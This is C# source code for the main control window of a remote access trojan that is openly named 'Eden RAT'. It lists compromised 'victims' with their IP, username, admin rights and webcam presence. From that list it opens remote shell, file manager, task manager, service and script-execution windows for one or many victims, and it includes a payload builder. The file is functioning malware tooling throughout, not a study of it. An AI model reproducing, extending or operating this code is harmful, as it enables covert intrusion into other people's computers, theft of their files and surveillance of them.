using System.Diagnostics;
using System.Reflection.Metadata.Ecma335;
using System.Text.Json;

namespace Eden
{
    public partial class frmMain : Form
    {
        public clsClient m_clnt;
        private List<List<string>> m_lsListener;

        public frmMain()
        {
            InitializeComponent();
        }

        #region Tools

        private bool fnClientIsNull() => m_clnt == null;

        #endregion

        void ServerMessageReceived(clsClient clnt, string szVictimID, List<string> aMsg)
        {
            if (!clsTools.fnClientEquals(clnt, m_clnt))
                return;

            try
            {
                if (aMsg[0] == "info")
                {
                    if (aMsg[1] == "start")
                    {
                        Dictionary<string, JsonElement>? dic = clsTools.EZData.JsonStr2Dic(aMsg[2]);
                        if (dic == null)
                            return;

                        string? szID = dic["ID"].GetString();
                        if (string.IsNullOrEmpty(szID))
                            return;

                        Invoke(new Action(() =>
                        {
                            //Victim Folder
                            string szDirectory = Path.Combine(new string[]
                            {
                            Application.StartupPath,
                            "Victim",
                            szVictimID,
                            });
                            if (!Directory.Exists(szDirectory))
                                Directory.CreateDirectory(szDirectory);

                            //Display in listview
                            string? szIP = dic["IP"].GetString();
                            string? szHostname = dic["Hostname"].GetString();
                            string? szUsername = dic["Username"].GetString();
                            string? szOS = dic["OS"].GetString();
                            int iUid = int.Parse(dic["uid"].GetString());
                            bool bAdmin = dic["admin"].GetBoolean();
                            bool bMonitor = dic["Monitor"].GetBoolean();
                            bool bWebcam = dic["Webcam"].GetBoolean();
                            decimal dPing = dic["Ping"].GetDecimal() + clnt.m_nLattency;
                            string? szCPU = dic["CPU"].GetString();

                            string? szDistro = dic["Distro"].GetString().ToLower();

                            ListViewItem item = new ListViewItem(szID);
                            item.SubItems.Add(szIP);
                            item.SubItems.Add(szHostname);
                            item.SubItems.Add(szUsername);
                            item.SubItems.Add(szOS);
                            item.SubItems.Add(iUid.ToString());
                            item.SubItems.Add(bAdmin ? "True" : "False");
                            item.SubItems.Add(bMonitor ? "True" : "False");
                            item.SubItems.Add(bWebcam ? "True" : "False");
                            item.SubItems.Add($"{dPing} ms");
                            item.SubItems.Add(szCPU);

                            ListViewItem? x = listView1.FindItemWithText(szID);

                            if (x == null)
                            {
                                var stVictimInfo = new clsVictim.stVictimInfo()
                                {
                                    clnt = m_clnt,

                                    ID = szID,
                                    IPAddr = szIP,
                                    Username = szUsername,
                                    OS = szOS,
                                    uid = iUid,
                                    isRoot = bAdmin,
                                    ExistsMonitor = bMonitor,
                                    ExistsWebcam = bWebcam,

                                    VictimDirectory = szDirectory,
                                };

                                clsVictim v = new clsVictim(stVictimInfo);
                                item.Tag = v;

                                if (imageList1.Images.Keys.Contains(szDistro))
                                    item.ImageKey = szDistro.ToLower();
                                else
                                    item.ImageKey = "unknown";

                                listView1.Items.Add(item);
                            }
                            else
                            {
                                for (int i = 1; i < item.SubItems.Count; i++)
                                    x.SubItems[i].Text = item.SubItems[i].Text;
                            }
                        }));
                    }
                }
                else if (aMsg[0] == "listener")
                {
                    if (aMsg[1] == "list")
                    {
                        if (aMsg[2] == "listener")
                        {
                            List<List<string>> lsListener = clsTools.EZData.String2TwoDList(aMsg[3]);
                            m_lsListener = lsListener;
                        }
                    }
                    else if (aMsg[1] == "del")
                    {
                        int nCode = int.Parse(aMsg[2]);
                        if (nCode == 1)
                        {
                            var lsVictimId = clsTools.EZData.String2OneDList(aMsg[3]);
                            Invoke(() =>
                            {
                                foreach (string id in lsVictimId)
                                {
                                    ListViewItem? item = listView1.FindItemWithText(id, true, 0);
                                    if (item == null)
                                        continue;

                                    listView1.Items.Remove(item);
                                }
                            });
                        }
                    }
                }
                else if (aMsg[0] == "disconnect")
                {
                    if (aMsg[1] == "victim")
                    {
                        Invoke(new Action(() =>
                        {
                            ListViewItem? item = listView1.FindItemWithText(aMsg[2]);
                            if (item != null)
                                listView1.Items.Remove(item);
                        }));
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        void Disconnect(clsClient clnt, string szMsg)
        {
            if (clnt == null)
                return;

            Invoke(new Action(() =>
            {
                MessageBox.Show("You are disconnected to the server.", "Disconnect", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                listView1.Items.Clear();

                m_clnt = null;

                toolStripMenuItem7.Enabled = m_clnt != null;
                toolStripButton1.Enabled = m_clnt != null;
            }));
        }

        void fnSetup()
        {
            toolStripMenuItem7.Enabled = m_clnt != null;
            toolStripButton1.Enabled = m_clnt != null;
            toolStripMenuItem12.Enabled = m_clnt != null;

            timer1.Start();
        }

        private void frmMain_Load(object sender, EventArgs e)
        {
            fnSetup();
        }

        private void toolStripButton1_Click(object sender, EventArgs e)
        {

        }

        private void toolStripButton2_Click(object sender, EventArgs e)
        {

        }

        private void toolStripMenuItem6_Click(object sender, EventArgs e)
        {
            frmConnect f = new frmConnect(null);
            f.ShowDialog();

            clsClient clnt = f.m_clnt;
            f.Dispose();

            if (clnt == null && m_clnt != null)
                return;

            toolStripMenuItem7.Enabled = clnt != null;
            toolStripButton1.Enabled = clnt != null;
            toolStripMenuItem12.Enabled = clnt != null;

            if (clnt == null)
                return;

            m_clnt = clnt;

            clnt.ServerMessageReceived += ServerMessageReceived;
            clnt.SocketDisconnect += Disconnect;

            clnt.SendCommand("user|list");
            clnt.SendCommand("listener|list|listener");
        }

        private void toolStripMenuItem7_Click(object sender, EventArgs e)
        {
            if (m_clnt == null)
                return;

            frmListener f = new frmListener(this, m_clnt);

            f.ShowDialog();
        }

        private void toolStripMenuItem5_Click(object sender, EventArgs e)
        {
            if (m_clnt == null)
                return;

            foreach (ListViewItem item in listView1.SelectedItems)
            {
                frmInformation frm;
                if (clsTools.FindForm<frmInformation>(item.Text) != null)
                    continue;

                frmInformation f = new frmInformation(clsTools.fnGetVictimTag(item));
                f.Show();
            }
        }

        private void toolStripMenuItem1_Click(object sender, EventArgs e)
        {
            if (m_clnt == null)
                return;

            foreach (ListViewItem item in listView1.SelectedItems)
            {
                frmFileMgr frm;
                if (clsTools.FindForm<frmFileMgr>(item.Text) != null)
                    continue;

                frmFileMgr f = new frmFileMgr(clsTools.fnGetVictimTag(item));
                f.m_clnt = m_clnt;
                f.szVictimID = item.Text;

                f.Show();
            }
        }

        private void toolStripButton1_Click_1(object sender, EventArgs e)
        {
            frmBuild f = new frmBuild(m_clnt);
            f.ShowDialog();
        }

        private void toolStripMenuItem3_Click(object sender, EventArgs e)
        {
            if (fnClientIsNull())
                return;

            foreach (ListViewItem item in listView1.SelectedItems)
            {
                if (clsTools.FindForm<frmTaskMgr>(item.Text) != null)
                    continue;

                frmTaskMgr f = new frmTaskMgr(clsTools.fnGetVictimTag(item));
                f.Show();
            }
        }

        private void toolStripMenuItem2_Click(object sender, EventArgs e)
        {
            if (fnClientIsNull())
                return;

            foreach (ListViewItem item in listView1.SelectedItems)
            {
                if (clsTools.FindForm<frmShell>(item.Text) != null)
                    continue;

                frmShell f = new frmShell(clsTools.fnGetVictimTag(item));
                f.Show();
            }
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            Text = $"Eden RAT v1.0.0 by ISSAC | Online[{listView1.Items.Count}] | " +
                $"Selected[{listView1.SelectedItems.Count}] | " +
                $"Is Connected: {(fnClientIsNull() ? "False" : "True")} | " +
                $"Server: {(m_clnt == null ? "N/A" : $"{m_clnt.m_szSrvIP}:{m_clnt.m_nSrvPort}")}";

            toolStripStatusLabel1.Text = $"Online[{listView1.Items.Count}]";
        }

        private void toolStripMenuItem4_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.SelectedItems)
            {
                clsVictim victim = clsTools.fnGetVictimTag(item);
                if (victim == null)
                    continue;

                Process.Start(new ProcessStartInfo()
                {
                    FileName = "explorer.exe",
                    Arguments = victim.m_szDirectory,
                    UseShellExecute = false,
                    CreateNoWindow = true,
                });
            }
        }

        private void Form1_FormClosed(object sender, FormClosedEventArgs e)
        {
            timer1.Stop();
        }

        private void toolStripMenuItem8_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.SelectedItems)
            {
                clsVictim victim = clsTools.fnGetVictimTag(item);
                frmService? f = clsTools.FindForm<frmService>(victim);
                if (f == null)
                {
                    f = new frmService(victim);
                    f.Show();
                }
                else
                {
                    f.BringToFront();
                }
            }
        }

        private void toolStripMenuItem9_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.SelectedItems)
            {
                clsVictim victim = clsTools.fnGetVictimTag(item);
                frmRunScript? f = clsTools.FindForm<frmRunScript>(victim);
                if (f == null)
                {
                    f = new frmRunScript(victim);
                    f.Show();
                }
                else
                {
                    f.BringToFront();
                }
            }
        }

        private void toolStripMenuItem11_Click(object sender, EventArgs e)
        {
            List<clsVictim> lsVictim = listView1.SelectedItems.Cast<ListViewItem>().Select(x => clsTools.fnGetVictimTag(x)).ToList();
            if (lsVictim.Count == 0)
                return;

            frmMultiScript f = new frmMultiScript(lsVictim);
            f.Show();
        }

        private void toolStripMenuItem12_Click(object sender, EventArgs e)
        {
            if (m_clnt == null)
                return;

            m_clnt.Disconnect();
            m_clnt = null;
        }

        private void toolStripMenuItem14_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.SelectedItems)
            {
                clsVictim victim = clsTools.fnGetVictimTag(item);
                if (victim == null)
                    continue;

                victim.fnSendCommand(new string[]
                {
                    "Connection",
                    "disconnect",
                });
            }
        }

        private void toolStripMenuItem15_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.SelectedItems)
            {
                clsVictim victim = clsTools.fnGetVictimTag(item);
                if (victim == null)
                    continue;

                victim.fnSendCommand(new string[]
                {
                    "Connection",
                    "reconnect",
                });
            }
        }

        private void toolStripButton2_Click_1(object sender, EventArgs e)
        {
            new frmAbout().Show();
        }
    }
}
